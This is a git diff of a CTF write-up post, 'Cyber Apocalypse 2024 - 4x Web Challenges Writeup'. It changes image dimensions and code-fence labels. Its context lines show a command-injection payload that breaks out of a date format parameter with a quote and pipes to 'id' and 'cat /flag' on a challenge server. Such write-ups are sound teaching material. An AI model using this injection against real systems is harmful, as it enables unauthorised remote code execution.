@@ -3,8 +3,8 @@ title: Cyber Apocalypse 2024 - 4x Web Challenges Writeup
 date: 2024-03-14 08:00:00 -0500
 image: 
  path: https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/htbimage.jpg
- height: 1500
- width: 650
+ height: 1400
+ width: 700
 categories: [HTB Writeups, Cyber Apocalypse CTF]
 tags: [Writeup, CTF, Web]
 ---
@@ -310,7 +310,7 @@ We can break the string by prefixing input with a `'` single-quote, then enter
 
 So our request look like this:
 
-```http
+```bash
 http://94.237.62.244:57142/?format=%Y-%m-%d'|id+%23
 ```
 
@@ -320,7 +320,7 @@ RCE is there. 🥳
 
 The last step is to run `cat /flag` and that will print the flag.
 
-```http
+```bash
 http://94.237.62.244:57142/?format=%Y-%m-%d%27|cat+/flag+%23
 ```
 
